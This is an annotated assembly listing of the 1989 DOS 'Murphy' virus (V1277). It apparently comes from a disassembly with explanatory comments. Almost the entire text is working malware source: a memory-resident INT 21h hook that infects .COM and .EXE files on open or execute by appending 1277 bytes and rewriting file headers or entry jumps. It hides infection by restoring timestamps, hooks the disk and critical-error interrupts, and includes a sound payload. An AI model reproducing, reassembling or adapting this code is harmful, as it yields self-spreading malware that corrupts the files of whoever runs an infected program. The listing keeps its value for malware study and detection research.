L0100:  JMP L08D0
    MOV AH,09H
    MOV DX,010CH
    INT 21H

L010A:  INT 20H

L010C:  DB  'Murphy virus V1.00 (V1277)$'
    DB  1961 DUP (1)

L08D0:  JMP L0C51

    NOP         ; \
    NOP         ;  \
    NOP         ;   \
L08D6:  MOV AH,09H      ;    \
    MOV DX,010CH    ;     > ORIGINAL 24 BYTES
    INT 21H     ;    /
L08DD:  INT 20H     ;   /
                ;  /
L08DF:  DB  'Murphy virus'  ; /

L08EB:  DW  2 DUP(0000H)
    MOV WORD PTR [DI],0040H ;DB 0C7H,25H,40H,00H
    AND [BX+SI],AX ;DB 21H,00H
    JNO L08F7 ;DB 71H,00H
L08F7:  XOR AL,[BX+DI] ;DB 32H,01H
    MOV CH,02H ;DB 0B5H,02H
    TEST    AL,0CH ;DB 0A8H,0CH
    PUSH    SI ;DB 56H
    ADD AX,0AF9H ;DB 05H,0F9H,0AH
    EXTRN L3BC8H_0001H:FAR
    JMP L3BC8H_0001H ;DB 0EAH,01H,00H,0C8H,3BH
    ADD CH,[BX+SI+200CH]

L090A:  DB  'Hello, I'm Murphy. Nice to meet you friend. '
    DB  'I'm written since Nov/Dec.'
    DB  ' Copywrite (c)1989 by Lubo & Ian, Sofia, USM Laboratory. '

; ********  INT21 DRIVER  ********

    CALL    L0C1B               ; SOUND SHOW

    CMP AX,4B59H            ; SPECIAL FUNCTION ?
    JNE L099A

    PUSH    BP              ; \
    MOV BP,SP               ;  \
    AND WORD PTR [BP+06H],-02H      ;   > FLAG C = 0
    POP BP              ;  /
    IRET                    ; /

L099A:  CMP AH,4BH              ; EXEC PROGRAM ?
    JE  L09B1

    CMP AX,3D00H            ; OPEN FILE ?
    JE  L09B1

    CMP AX,6C00H            ; OPEN FILE ( MS DOS v4.xx )
    JNE L09AE
    CMP BL,00H
    JE  L09B1

L09AE:  JMP L0A56               ; NO. ORIGINAL INT21

L09B1:  PUSH    ES              ; \
    PUSH    DS              ;  > SAVE REGISTERS
L09B3:  DB  'WVURQSP'           ; /

    CALL    L0B86               ; SET NEW INT24 & INT13

    CMP AX,6C00H            ; \
    JNE L09C4               ;  > MS DOS v4.xx NAME -> DS:SI
    MOV DX,SI               ; /

L09C4:  MOV CX,0080H

    MOV SI,DX               ; \
L09C9:  INC SI              ;  \
    MOV AL,[SI]             ;   > SEARCH EXTENSION
    OR  AL,AL               ;  /
    LOOPNZ  L09C9               ; /

    SUB SI,+02H

    CMP WORD PTR [SI],4D4FH     ; 'OM' ?
    JE  L09EB

    CMP WORD PTR [SI],4558H     ; 'XE' ?
    JE  L09E2

L09DF:  JMP SHORT L0A4A

    NOP
L09E2:  CMP WORD PTR [SI-02H],452EH     ; '.C' ?
    JE  L09F2

    JMP SHORT L09DF

L09EB:  CMP WORD PTR [SI-02H],432EH     ; '.E' ?
    JNE L09DF

L09F2:  MOV AX,3D02H            ; OPEN FILE
    CALL    L0B7F
    JB  L0A4A

    MOV BX,AX

    MOV AX,5700H            ; GET DATE & TIME
    CALL    L0B7F

    MOV CS:[0121H],CX           ; SAVE DATE & TIME
    MOV CS:[0123H],DX

    MOV AX,4200H            ; MOVE 'FP' TO BEGIN FILE ???
    XOR CX,CX
    XOR DX,DX
    CALL    L0B7F

    PUSH    CS              ; MY SEGMENT
    POP DS

    MOV DX,0103H            ; READ ORIGINAL 24 BYTES
    MOV SI,DX
    MOV CX,0018H
    MOV AH,3FH
    CALL    L0B7F
    JB  L0A35

    CMP WORD PTR [SI],5A4DH     ; 'EXE' FILE ?
    JNE L0A32

    CALL    L0A5B               ; INFECT 'EXE' FILE
    JMP SHORT L0A35

L0A32:  CALL    L0B2B               ; INFECT 'COM' FILE

L0A35:  MOV AX,5701H            ; SET ORIGINAL DATE & TIME
    MOV CX,CS:[0121H]
    MOV DX,CS:[0123H]
    CALL    L0B7F

    MOV AH,3EH              ; CLOSE FILE

    CALL    L0B7F               ; RESTORE INT13 & INT24

L0A4A:  CALL    L0BC3

L0A4D:  DB  'X[YZ]^_'           ; RESTORE REGISTERS
    POP DS
    POP ES

L0A56:  JMP DWORD PTR CS:[0129H]        ; ORIGINAL INT21

; ********  INFECT 'EXE' PROGRAM  ********

L0A5B:  MOV CX,[SI+16H]         ; CS SEGMENT

    ADD CX,[SI+08H]         ; + HEADER SIZE

    MOV AX,0010H            ; PARA -> BYTES
    MUL CX

    ADD AX,[SI+14H]         ; DX:AX = START FILE
    ADC DX,+00H

    PUSH    DX              ; SAVE START FILE OFFSET
    PUSH    AX

    MOV AX,4202H            ; MOVE FP TO END FILE
    XOR CX,CX               ; (GET FILE SIZE)
    XOR DX,DX
    CALL    L0B7F

    CMP DX,+00H             ; SIZE < 1277 ???
    JNE L0A88
    CMP AX,04FDH
    NOP
    JNB L0A88

    POP AX              ; QUIT
    POP DX
    JMP L0B0D

L0A88:  MOV DI,AX               ; SAVE FILE SIZE
    MOV BP,DX

    POP CX              ; CALC CODE SIZE
    SUB AX,CX
    POP CX
    SBB DX,CX

    CMP WORD PTR [SI+0CH],+00H      ; HIGH FILE ?
    JE  L0B0D

    CMP DX,+00H             ; CODE SIZE = 1277
    JNE L0AA3
    CMP AX,04FDH
    NOP
    JE  L0B0D

L0AA3:  MOV DX,BP               ; FILE SIZE
    MOV AX,DI

    PUSH    DX              ; SAVE FILE SIZE
    PUSH    AX

    ADD AX,04FDH            ; CALC NEW FILE SIZE
    NOP
    ADC DX,+00H

    MOV CX,0200H            ; CALC FILE SIZE FOR HEADER
    DIV CX

    LES DI,DWORD PTR [SI+02H]       ; SAVE OLD CODE SIZE
    MOV CS:[0125H],DI
    MOV CS:[0127H],ES

    MOV [SI+02H],DX         ; SAVE NEW CODE SIZE
    CMP DX,+00H
    JE  L0ACB
    INC AX
L0ACB:  MOV [SI+04H],AX

    POP AX              ; RESTORE ORIGINAL FILE SIZE
    POP DX

    CALL    L0B0E               ; ???

    SUB AX,[SI+08H]

    LES DI,DWORD PTR [SI+14H]       ; SAVE OLD CS:IP
    MOV DS:[011BH],DI
    MOV DS:[011DH],ES

    MOV [SI+14H],DX         ; SET NEW CS:IP
    MOV [SI+16H],AX

    MOV WORD PTR DS:[011FH],AX      ; SAVE OFFSET

    MOV AX,4202H            ; MOVE FP TO END FILE
    XOR CX,CX
    XOR DX,DX
    CALL    L0B7F

    CALL    L0B1F               ; WRITE CODE
    JB  L0B0D

    MOV AX,4200H            ; MOVE FP TO BEGIN FILE
    XOR CX,CX
    XOR DX,DX
    CALL    L0B7F

    MOV AH,40H              ; WRITE HEADER
    MOV DX,SI
    MOV CX,0018H
    CALL    L0B7F

L0B0D:  RET

L0B0E:  MOV CX,0004H            ; ???
    MOV DI,AX
    AND DI,+0FH
L0B16:  SHR DX,1
    RCR AX,1
    LOOP    L0B16
    MOV DX,DI
    RET  

L0B1F:  MOV AH,40H              ; WRITE VIRUS CODE
    MOV CX,04FDH            ; SIZE = 1277
    NOP
    MOV DX,0100H
    JMP SHORT L0B7F
    NOP


; ********  INFECT 'COM' PROGRAM  ********

L0B2B:  MOV AX,4202H            ; MOVE FP TO END FILE
    XOR CX,CX
    XOR DX,DX
    CALL    L0B7F

    CMP AX,04FDH            ; FILE SIZE < 1277 ?
    NOP
    JB  L0B7E

    CMP AX,0FAE2H           ; FILE SIZE > 64226
    NOP
    JNB L0B7E

    PUSH    AX              ; SAVE SIZE

    CMP BYTE PTR [SI],0E9H      ; 'JUMP' CODE ?
    JNE L0B53

    SUB AX,0500H            ; CALC OFFSET FOR VIRUS
    NOP

    CMP AX,[SI+01H]         ; FILE IS INFECTET ?
    JNE L0B53

    POP AX
    JMP SHORT L0B7E

L0B53:  CALL    L0B1F               ; WRITE VIRUS CODE
    JNB L0B5B

    POP AX              ; ERROR
    JMP SHORT L0B7E

L0B5B:  MOV AX,4200H            ; MOVE FP TO BEGIN FILE
    XOR CX,CX
    XOR DX,DX
    CALL    L0B7F

    POP AX              ; CALC OFFSET FOR JUMP
    SUB AX,0003H

    MOV DX,011BH            ; DATA ARREA
    MOV SI,DX

    MOV BYTE PTR CS:[SI],0E9H       ; SAVE JUMP CODE TO ARREA
    MOV CS:[SI+01H],AX

    MOV AH,40H              ; WRITE FIRST 3 BYTES
    MOV CX,0003H
    CALL    L0B7F

L0B7E:  RET


; ********  VIRUS INT21  ********

L0B7F:  PUSHF
    CALL    DWORD PTR CS:[0129H]
    RET

; ********  SET NEW INT24 & INT13  ********

L0B86:  PUSH    AX              ; SAVE REGISTERS
    PUSH    DS
    PUSH    ES

    XOR AX,AX               ; SEGMENT AT VECTOR TABLE
    PUSH    AX
    POP DS

    CLI

    LES AX,DWORD PTR DS:[0090H]     ; \
    MOV WORD PTR CS:[012DH],AX      ;  > GET ADDRES INT24
    MOV CS:[012FH],ES           ; /

    MOV AX,0418H            ; \
    MOV WORD PTR DS:[0090H],AX      ;  > SET NEW INT24
    MOV DS:[0092H],CS           ; /

    LES AX,DWORD PTR DS:[004CH]     ; \
    MOV WORD PTR CS:[0135H],AX      ;  > GET ADDRES INT13
    MOV CS:[0137H],ES           ; /

    LES AX,DWORD PTR CS:[0131H]     ; \
    MOV WORD PTR DS:[004CH],AX      ;  > SET NEW INT13
    MOV DS:[004EH],ES           ; /

    STI

    POP ES              ; RESTORE REGISTERS
    POP DS
    POP AX
    RET

; ********  RESTORE INT24 & INT13  ********

L0BC3:  PUSH    AX
    PUSH    DS
    PUSH    ES
    XOR AX,AX
    PUSH    AX
    POP DS

    CLI

    LES AX,DWORD PTR CS:[012DH]     ; \
    MOV WORD PTR DS:[0090H],AX      ;  > RESTORE INT24
    MOV DS:[0092H],ES           ; /

    LES AX,DWORD PTR CS:[0135H]     ; \
    MOV WORD PTR DS:[004CH],AX      ;  > RESTORE INT13
    MOV DS:[004EH],ES           ; /

    STI

    POP ES
    POP DS
    POP AX
    RET


; ********  INT13 DRIVER  ********

L0BE8:  TEST    AH,80H              ; HARD DISK ?
    JE  L0BF2

    JMP DWORD PTR CS:[012DH]        ; YES.

L0BF2:  ADD SP,+06H             ; POP REGISTERS
L0BF5:  DB  'X[YZ^_]'
    POP DS
    POP ES
    PUSH    BP
    MOV BP,SP
    OR  WORD PTR [BP+06H],+01H      ; FLAG C=1
    POP BP
    IRET


; ********  SOUOND DRIVER  *********

L0C07:  MOV AL,0B6H
    OUT 43H,AL
    MOV AX,0064H
    OUT 42H,AL
    MOV AL,AH
    OUT 42H,AL
    IN  AL,61H
    OR  AL,03H
    OUT 61H,AL
    RET


; ********  SHOW DRIVER  ********

L0C1B:  PUSH    AX              ; SAVE REGISTERS
    PUSH    CX
    PUSH    DX
    PUSH    DS

    XOR AX,AX               ; DOS ARREA SEGMENT
    PUSH    AX
    POP DS

    MOV AX,WORD PTR DS:[046CH]      ; GET TIME
    MOV DX,DS:[046EH]

    MOV CX,0FFFFH           ; DIVIDE BY 65535
    DIV CX              ; 1 HOUR - 65535 TICKS 

    CMP AX,000AH            ; TEN HOUR ?
    JNE L0C37

    CALL    L0C07               ; SHOW

L0C37:  POP DS              ; RESTORE REGISTERS
    POP DX
    POP CX
    POP AX
    RET

L0C3C:  MOV DX,0010H            ; DX:AX = AX * 16
    MUL DX
    RET


; CLEAR REGISTERS ????

L0C42:  XOR AX,AX
    XOR BX,BX
    XOR CX,CX
    XOR DX,DX
    XOR SI,SI
    XOR DI,DI
    XOR BP,BP
    RET

L0C51:  PUSH    DS

    CALL    L0C55               ; PUSH ADDRES

L0C55:  MOV AX,4B59H            ; I'M IN MEMORY ?
    INT 21H
L0C5A:  JB  L0C5F               ; NO. INSERT CODE

    JMP L0D87               ; START FILE

L0C5F:  POP SI              ; POP MY ADDRESS
    PUSH    SI

    MOV DI,SI

    XOR AX,AX               ; DS = VECTOR TABLE SEGMENT
    PUSH    AX
    POP DS

    LES AX,DWORD PTR DS:[004CH]     ; GET INT13 ADDRESS
    MOV CS:[SI+0FCACH],AX
    MOV CS:[SI+0FCAEH],ES

    LES BX,DWORD PTR DS:[0084H]     ; GET INT21 ADDRESS
    MOV CS:[DI+0FCA4H],BX
    MOV CS:[DI+0FCA6H],ES

    MOV AX,WORD PTR DS:[0102H]      ; SEGMENT OF INT40
    CMP AX,0F000H           ; IN ROM BIOS ?
    JNE L0CF4               ; NO. NOT HARD DISK IN SYSTEM

    MOV DL,80H

    MOV AX,WORD PTR DS:[0106H]      ; SEGMENT OF INT41

    CMP AX,0F000H           ; ROM BIOS ?
    JE  L0CB1

    CMP AH,0C8H             ; < ROM EXTERNAL ARREA
    JB  L0CF4

    CMP AH,0F4H             ; > ROM EXTERNAL ARREA
    JNB L0CF4

    TEST    AL,7FH
    JNE L0CF4

    MOV DS,AX

    CMP WORD PTR DS:[0000H],0AA55H  ; BEGIN ROM MODUL ?
    JNE L0CF4

    MOV DL,DS:[0002H]           ; SCANING FOR ORIGINAL INT13
L0CB1:  MOV DS,AX               ; ADDRESS
    XOR DH,DH
    MOV CL,09H
    SHL DX,CL
    MOV CX,DX
    XOR SI,SI
L0CBD:  LODSW
    CMP AX,0FA80H
    JNE L0CCB
    LODSW
    CMP AX,7380H
    JE  L0CD6
    JNE L0CE0
L0CCB:  CMP AX,0C2F6H
    JNE L0CE2
    LODSW
    CMP AX,7580H
    JNE L0CE0
L0CD6:  INC SI
    LODSW
    CMP AX,40CDH
    JE  L0CE7
    SUB SI,+03H
L0CE0:  DEC SI
    DEC SI
L0CE2:  DEC SI
    LOOP    L0CBD
    JMP SHORT L0CF4
L0CE7:  SUB SI,+07H
    MOV CS:[DI+0FCACH],SI
    MOV CS:[DI+0FCAEH],DS

L0CF4:  MOV AH,62H              ; TAKE 'PSP' SEGMENT
    INT 21H

L0CF8:  MOV ES,BX               ; FREE MY BLOCK
    MOV AH,49H
    INT 21H

L0CFE:  MOV BX,0FFFFH           ; GET BLOCK SIZE
    MOV AH,48H
    INT 21H

L0D05:  SUB BX,0051H            ; FREE SPACE ?
    JB  L0D87

    MOV CX,ES               ; CALC NEW BLOCK SIZE
    STC
    ADC CX,BX

    MOV AH,4AH              ; SET NEW SIZE
    INT 21H

L0D14:  MOV BX,0050H
    NOP
    STC
    SBB ES:[0002H],BX
    PUSH    ES
    MOV ES,CX
    MOV AH,4AH
    INT 21H

L0D25:  MOV AX,ES
    DEC AX
    MOV DS,AX
    MOV WORD PTR DS:[0001H],0008H
    CALL    L0C3C
    MOV BX,AX
    MOV CX,DX
    POP DS
    MOV AX,DS
    CALL    L0C3C
    ADD AX,DS:[0006H]
    ADC DX,+00H
    SUB AX,BX
    SBB DX,CX
    JB  L0D4E
    SUB DS:[0006H],AX
L0D4E:  MOV SI,DI
    XOR DI,DI
    PUSH    CS
    POP DS
    SUB SI,0385H
    MOV CX,04FDH
    NOP
    INC CX
    REPZ    MOVSB
    MOV AH,62H
    INT 21H

L0D63:  DEC BX
    MOV DS,BX
    MOV BYTE PTR DS:[0000H],5AH
    MOV DX,01B9H
    XOR AX,AX
    PUSH    AX
    POP DS
    MOV AX,ES
    SUB AX,0010H
    MOV ES,AX
    CLI
    MOV DS:[0084H],DX
    MOV DS:[0086H],ES
    STI
    DEC BYTE PTR DS:[047BH]
L0D87:  POP SI
    CMP WORD PTR CS:[SI+0FC7EH],5A4DH
    JNE L0DAE
    POP DS
    MOV AX,CS:[SI+0FC9AH]
    MOV BX,CS:[SI+0FC98H]
    PUSH    CS
    POP CX
    SUB CX,AX
    ADD CX,BX
    PUSH    CX
    PUSH    WORD PTR CS:[SI+0FC96H]
    PUSH    DS
    POP ES
    CALL    L0C42
    RETF

L0DAE:  POP AX
    MOV AX,CS:[SI+0FC7EH]
    MOV WORD PTR CS:[0100H],AX
    MOV AX,CS:[SI+0FC80H]
    MOV WORD PTR CS:[0102H],AX
    MOV AX,0100H
    PUSH    AX
    PUSH    CS
    POP DS
    PUSH    DS
    POP ES
    CALL    L0C42
    RET

L0DCD:  DW  0000H
